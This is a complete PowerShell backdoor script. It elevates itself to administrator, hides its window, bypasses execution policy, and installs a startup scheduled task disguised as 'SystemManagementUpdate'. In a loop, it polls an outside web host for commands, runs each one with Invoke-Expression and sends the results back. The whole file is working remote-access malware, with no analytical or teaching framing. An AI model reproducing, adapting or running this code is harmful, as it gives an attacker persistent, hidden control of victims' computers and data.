$cfHost = "https://connect.aniketpandey.website"
$delay = 1
$maxRetries = 5
$retryCount = 0

# --- Self-elevate to admin and relaunch hidden ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch as admin in a hidden window
    Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

# --- We are admin from here ---

# Persistence: register scheduled task so it survives reboots
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Force | Out-Null

# --- Main loop ---
function Connect-Cloudflare {
    while ($true) {
        try {
            $response = Invoke-WebRequest -Uri "$cfHost/cmd" -UseBasicParsing -TimeoutSec 10
            $command = $response.Content.Trim()

            if ($command -and $command -ne "") {
                $retryCount = 0

                if ($command -eq "exit") { break }

                try {
                    $result = Invoke-Expression $command 2>&1 | Out-String
                } catch {
                    $result = "Error: " + $_.Exception.Message
                }

                $body = "PS " + (Get-Location).Path + "> " + $command + "`n" + $result + "`n"
                Invoke-WebRequest -Uri "$cfHost/result" -Method POST -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
            }

            Start-Sleep -Seconds $delay
        }
        catch {
            $retryCount++
            if ($retryCount -ge $maxRetries) {
                $retryCount = 0
            }
            Start-Sleep -Seconds $delay
        }
    }
}

Connect-Cloudflare
